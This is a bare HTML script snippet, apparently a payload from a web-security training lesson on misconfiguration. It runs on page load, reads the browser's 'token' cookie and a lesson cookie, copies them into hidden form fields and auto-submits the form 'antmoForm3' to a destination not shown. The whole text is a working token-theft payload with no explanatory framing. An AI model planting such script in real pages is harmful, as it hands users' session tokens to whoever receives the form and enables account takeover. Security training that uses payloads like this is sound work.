<script>
    document.getElementById("antmoForm3").submit();
    function getCookie(cname) {
        var name = cname + "=";
        var decodedCookie = decodeURIComponent(document.cookie);
        console.log(decodedCookie)
        var ca = decodedCookie.split(';');
        for(var i = 0; i <ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) == ' ') {
                c = c.substring(1);
            }
            if (c.indexOf(name) == 0) {
                return c.substring(name.length, c.length);
            }
        }
        return cname + " not found";
    }
    document.getElementById("tokenid").value = getCookie("token")
    document.getElementById("msgid").value = getCookie("securityMisconfigLesson")
    document.getElementById("antmoForm3").submit();
</script>
